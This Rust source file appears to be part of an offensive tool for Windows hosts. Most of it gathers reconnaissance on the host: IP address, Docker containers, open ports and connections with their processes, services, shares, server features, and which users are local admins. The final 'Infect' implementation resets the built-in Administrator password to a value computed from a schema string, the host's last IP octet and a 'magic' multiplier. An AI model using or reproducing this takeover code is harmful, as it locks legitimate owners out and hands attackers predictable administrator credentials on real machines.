use std::collections::HashMap;
use std::collections::HashSet;

use wmi::*;
use serde::Deserialize;
use local_ip_address::local_ip;
use sysinfo::{ProcessExt, System, SystemExt, UserExt};
use netstat::*;
use super::types::*;
use serde_json::Map;
use serde_json::Value;
use once_cell::sync::Lazy;


static LOCAL_DOMAIN_ID: Lazy<String> = Lazy::new(|| {
    // Get seperate list of users and filter for local admin
    let binding = sysinfo::System::new_all();
    let all_users = binding.users();

    // Extract domain id from local admin
    let domain_id = all_users.iter()
        .filter_map(|user| {
            let uid = &user.id().to_string();
            match get_rid_from_sid(uid) {
                Some(rid) if rid == "500" => {
                    match get_domain_id_from_sid(uid) {
                        Ok(domain_id) => Some(domain_id),
                        Err(_) => None,
                    }
                }
                _ => None,
            }
        })
        .next();

        return domain_id.unwrap()
});

 
// retrieve windows features

impl From<TcpState> for ConnectionState {
    fn from(tcp_state: TcpState) -> Self {
        match tcp_state {
            TcpState::Established => ConnectionState::Established,
            TcpState::SynSent => ConnectionState::SynSent,
            TcpState::SynReceived => ConnectionState::SynRecv,
            TcpState::FinWait1 => ConnectionState::FinWait1,
            TcpState::FinWait2 => ConnectionState::FinWait2,
            TcpState::TimeWait => ConnectionState::TimeWait,
            TcpState::Closed => ConnectionState::Closed,
            TcpState::CloseWait => ConnectionState::CloseWait,
            TcpState::LastAck => ConnectionState::LastAck,
            TcpState::Listen => ConnectionState::Listen,
            TcpState::Closing => ConnectionState::Closing,
            _ => ConnectionState::Unknown,
        }
    }
}

fn get_container_ids(command: &str) -> Vec<String> {
    let output = super::utils::CommandExecutor::execute_command(command, Some(&["ps", "-q"]), None);
    match output {
        Ok(output) => String::from_utf8_lossy(&output.stdout)
            .lines()
            .map(String::from)
            .collect(),
        Err(_) => Vec::new(),
    }
}

fn get_generic_containers(command: &str) -> Vec<super::types::Container> {
    let container_ids = get_container_ids(command);

    container_ids
        .iter()
        .filter_map(|id| {
            let inspect_str = match super::utils::CommandExecutor::execute_command(
                command,
                Some(&["inspect", id]),
                None,
            ) {
                Ok(output) => String::from_utf8_lossy(&output.stdout).into(),
                Err(_) => "".to_string(),
            };
            generic_container(&inspect_str).ok()
        })
        .collect()
}

fn generic_container(inspect_data: &str) -> Result<super::types::Container, serde_json::Error> {
    let json: serde_json::Value = serde_json::from_str(inspect_data)?;

    let container_info = &json[0];

    Ok(super::types::Container {
        name: container_info["Name"].as_str().unwrap_or_default().into(),
        status: container_info["State"]["Status"]
            .as_str()
            .unwrap_or_default()
            .into(),
        container_id: container_info["Id"].as_str().unwrap_or_default().into(),
        cmd: container_info["Config"]["Cmd"]
            .as_array()
            .unwrap_or(&vec!["".into()])[0]
            .as_str()
            .unwrap_or_default()
            .into(),
        port_bindings: port_from_inspect(&container_info["NetworkSettings"]["Ports"].as_object())
            .into(),
        volumes: volumes_from_inspect(&container_info["Mounts"].as_array()).into(),
        networks: networks_from_inspect(&container_info["NetworkSettings"]["Networks"].as_object()),
    })
}


fn volumes_from_inspect(mounts: &Option<&Vec<Value>>) -> Box<[super::types::ContainerVolume]> {
    mounts.map_or(Box::new([]), |mounts| {
        mounts
            .iter()
            .filter_map(|mount| {
                Some(super::types::ContainerVolume {
                    host_path: mount["Source"].as_str()?.into(),
                    container_path: mount["Destination"].as_str()?.into(),
                    mode: mount["Mode"].as_str()?.into(),
                    volume_name: mount["Name"].as_str()?.into(),
                    rw: mount["RW"].as_bool()?,
                    v_type: mount["Type"].as_str()?.into(),
                })
            })
            .collect::<Box<_>>()
        // .into_boxed_slice()
    })
}


fn networks_from_inspect(
    networks: &Option<&Map<String, Value>>,
) -> Box<[super::types::ContainerNetwork]> {
    // Parse the JSON and extract network information
    networks.map_or(Box::new([]), |networks| {
        networks
            .iter()
            .map(|(name, network_data)| super::types::ContainerNetwork {
                network_name: name.clone().into_boxed_str(),
                ip: network_data["IPAddress"]
                    .as_str()
                    .unwrap_or_default()
                    .into(),
                gateway: network_data["Gateway"].as_str().unwrap_or_default().into(),
                mac_address: network_data["MacAddress"]
                    .as_str()
                    .unwrap_or_default()
                    .into(),
            })
            .collect::<Box<_>>()
    })
}

fn port_from_inspect(port_map: &Option<&Map<String, Value>>) -> Box<[Box<str>]> {
    port_map.map_or(Box::new([] as [Box<str>; 0]), |ports_map| {
        ports_map
            .iter()
            .flat_map(|(container_port, host_ports)| {
                host_ports
                    .as_array()
                    .map_or(Vec::new(), |host_ports_array| {
                        host_ports_array
                            .iter()
                            .filter_map(|host_port_details| {
                                let host_ip =
                                    host_port_details["HostIp"].as_str().unwrap_or("0.0.0.0");
                                let host_port =
                                    host_port_details["HostPort"].as_str().unwrap_or("");
                                Some(
                                    format!("{}:{}->{}", host_ip, host_port, container_port)
                                        .into_boxed_str(),
                                )
                            })
                            .collect::<Vec<Box<str>>>()
                    })
            })
            .collect::<Box<[Box<str>]>>() // Directly collecting into a Boxed Slice
    })
}






// Retrieve NetworkInfo
impl OS for Host {
    fn ip() -> Box<str> {
        let my_local_ip = local_ip().unwrap().to_string().into_boxed_str();
        return my_local_ip;
    }

    fn containers() -> Box<[Container]> {
        let mut containers = Vec::new();

        if which::which("docker").is_ok() {
            containers.extend(get_generic_containers("docker"));
        }

        containers.into_boxed_slice()
    }

    fn conn_info() -> (Box<[NetworkConnection]>, Box<[OpenPort]>) {
        let sys = System::new_all();
        let af_flags = AddressFamilyFlags::IPV4 | AddressFamilyFlags::IPV6;
        let proto_flags = ProtocolFlags::TCP | ProtocolFlags::UDP;
        let iterator =
            iterate_sockets_info(af_flags, proto_flags).expect("Failed to get socket information!");

        let mut sockets: Vec<NetworkConnection> = Vec::new();
        let mut open_ports_set: HashSet<OpenPort> = HashSet::new();

        // Preprocess all_processes into a HashMap for O(1) access time
        let all_processes = process_info(&sys)
            .into_iter()
            .map(|p| (p.pid, p))
            .collect::<HashMap<_, _>>();

        // Boxed strings for protocols to avoid repeated heap allocations
        let tcp_protocol = "TCP".to_string().into_boxed_str();
        let udp_protocol = "UDP".to_string().into_boxed_str();

        for info in iterator {
            let si = match info {
                Ok(si) => si,
                Err(_err) => {
                    println!("Failed to get info for socket!");
                    continue;
                }
            };

            // Gather associated processes
            let processes: Vec<Process> = si
                .associated_pids
                .into_iter()
                .filter_map(|pid| all_processes.get(&pid))
                .map(|process| Process {
                    pid: process.pid,
                    name: process.name.clone(),
                })
                .collect();

            match si.protocol_socket_info {
                ProtocolSocketInfo::Tcp(tcp) => {
                    let local_address = tcp.local_addr.to_string().into_boxed_str();
                    let remote_address = tcp.remote_addr.to_string().into_boxed_str();
                    let state = Some(tcp.state.into());
                    let process = processes.first().cloned();

                    sockets.push(NetworkConnection {
                        local_address,
                        remote_address: Some(remote_address.clone()),
                        protocol: tcp_protocol.clone(),
                        state: state.clone(),
                        process: process.clone(),
                    });

                    let new_open_port = OpenPort {
                        port: tcp.local_port,
                        protocol: tcp_protocol.clone(),
                        process: process,
                        version: "".to_string().into_boxed_str(),
                        state: state,
                    };

                    // Use HashSet for efficient existence check
                    open_ports_set.insert(new_open_port.clone());
                }
                ProtocolSocketInfo::Udp(udp) => {
                    sockets.push(NetworkConnection {
                        local_address: udp.local_addr.to_string().into_boxed_str(),
                        remote_address: None,
                        protocol: udp_protocol.clone(),
                        state: None,
                        process: processes.first().cloned(),
                    });
                }
            }
        }
        (
            sockets.into_boxed_slice(),
            open_ports_set
                .into_iter()
                .collect::<Vec<_>>()
                .into_boxed_slice(),
        )
    }

    fn services() -> Box<[Service]> {
        let com_lib = match COMLibrary::new() {
            Ok(lib) => lib,
            _ => return Box::new([]), // or handle the error as appropriate
        };
        
        let wmi_con = match WMIConnection::new(com_lib) {
            Ok(con) => con,
            _ => return Box::new([]), // or handle the error as appropriate
        };
        
        let results: Vec<HashMap<String, Variant>> = wmi_con.raw_query("SELECT * FROM Win32_Service").unwrap();
        let mut services = Vec::new();
        for os in results {
            services.push(Service {
                name: match os.get("Name").unwrap() {
                    Variant::String(s) => s.clone().into_boxed_str(),
                    _ => "".to_string().into_boxed_str(),
                },
                status: match os.get("State").unwrap() {
                    Variant::String(s) => match s.as_str() {
                        "Running" => Some(ServiceStatus::Active),
                        "Stopped" => Some(ServiceStatus::Inactive),
                        "Paused" => Some(ServiceStatus::Inactive),
                        "Start Pending" => Some(ServiceStatus::Inactive),
                        "Stop Pending" => Some(ServiceStatus::Inactive),
                        "Continue Pending" => Some(ServiceStatus::Inactive),
                        "Pause Pending" => Some(ServiceStatus::Inactive),
                        "Unknown" => Some(ServiceStatus::Unknown),
                        _ => Some(ServiceStatus::Failed),
                    },
                    _ => None,
                },

                start_mode: match os.get("StartMode").unwrap() {
                    Variant::String(s) => if s == "Auto" { Some(ServiceStartType::Enabled) } else { Some(ServiceStartType::Disabled) } ,
                    _ => panic!("Unexpected type for StartMode"),
                },

                state: match os.get("Status").unwrap() {
                    Variant::String(s) => if s == "OK" { s.to_string().into_boxed_str() } else { s.to_string().into_boxed_str() } ,
                    _ => "".to_string().into_boxed_str(),
                },
            });
        }

        return services.into_boxed_slice();
    }

    fn shares() -> Box<[Share]> {
        let com_lib = match COMLibrary::new() {
            Ok(lib) => lib,
            _ => return Box::new([]), // or handle the error as appropriate
        };
        
        let wmi_con = match WMIConnection::new(com_lib) {
            Ok(con) => con,
            _ => return Box::new([]), // or handle the error as appropriate
        };
        
        let results: Vec<HashMap<String, Variant>> = wmi_con.raw_query("SELECT * FROM Win32_Share").unwrap();
        let mut shares: Vec<Share> = Vec::new();
        for os in results {
            shares.push(Share {
                share_type: ShareType::SMB,
                network_path: match os.get("Path").unwrap() {
                    Variant::String(s) => s.to_string().into_boxed_str(),
                    _ => "".to_string().into_boxed_str(),
                },
            });
        }

        return shares.into_boxed_slice();
    }

}



// uint32 ID;
// uint32 ParentID;
// string Name;
#[derive(Deserialize, Debug)]
#[serde(rename = "Win32_ServerFeature")]
#[serde(rename_all = "PascalCase")]
pub struct Win32ServerFeatures {
    name: String,

}


#[derive(Deserialize, Debug)]
#[serde(rename = "Win32_OperatingSystem")]
#[serde(rename_all = "PascalCase")]
struct OperatingSystem {
    caption: String,
}

impl ServerFeatures for Host {
    fn server_features() -> Box<[String]> {
        let com_lib = match COMLibrary::new() {
            Ok(lib) => lib,
            _ => return Box::new([]), // or handle the error as appropriate
        };
        
        let wmi_con = match WMIConnection::new(com_lib) {
            Ok(con) => con,
            _ => return Box::new([]), // or handle the error as appropriate
        };

        let results: Vec<OperatingSystem> = wmi_con.query().unwrap();
    
        let mut is_server = false;
        results.iter().filter(|os| {
            os.caption.to_lowercase().contains("server")
        }).for_each(|os| {
            println!("Server: {}", os.caption);
            is_server = true;
        });
    
        if is_server == true {
            let server_features: Vec<Win32ServerFeatures> = wmi_con.query().unwrap();
            return server_features.iter().map(|feature| {
                feature.name.clone()
            }).collect::<Vec<String>>().into_boxed_slice();
        } else {
            return Box::new([]);   
        }
    }
}

fn process_info(sys: &System) -> std::vec::Vec<Process> {
    let processes = sys.processes();

    let mut process_dump = vec![];

    for (pid, process_data) in processes {

        let value = Process {
            pid: pid.to_string().parse::<u32>().unwrap(),
            name: process_data.name().to_string().into_boxed_str(),
        };
        process_dump.push(value);
    }
    return process_dump
}

fn get_rid_from_sid(sid: &str) -> Option<&str> {
    sid.split('-').last()
}

fn get_domain_id_from_sid(sid: &str) -> Result<String, &'static str> {
    let parts: Vec<&str> = sid.split('-').collect();

    // Check if SID has the correct format
    if parts.len() < 8 || parts[0] != "S" {
        return Err("Invalid SID format");
    }

    // Extract the domain identifier parts
    let sub_authority1 = parts[4];
    let sub_authority2 = parts[5];
    let sub_authority3 = parts[6];

    // Combine the parts to form the domain identifier
    let domain_identifier = format!("{}-{}-{}", sub_authority1, sub_authority2, sub_authority3);

    Ok(domain_identifier)
}


impl UserInfo for sysinfo::User {
    fn is_admin(&self) -> bool {
        // Check for sudoers group in groups or uid 0 (root)
        self.groups().iter().any(|group| group == "Administrators") || self.id().to_string() == "0"
    }

    fn is_local(&self) -> bool {
        // Compare local domain id to domain ids of current user
        return match get_domain_id_from_sid(&self.id().to_string()) {
            Ok(local_sid_value) => *LOCAL_DOMAIN_ID == local_sid_value,
            Err(_) => false,
        }
    }
}


impl Infect for Host {
    fn change_password(&self, magic: u8, schema: &str) {
        let password = format!(
            "{}{:?}!",
            schema,
            self.ip.split('.').last().unwrap().parse::<u16>().unwrap() * magic as u16
        );

        let thing = netuser_rs::users::change_user_password("Administrator", &password);
    }
}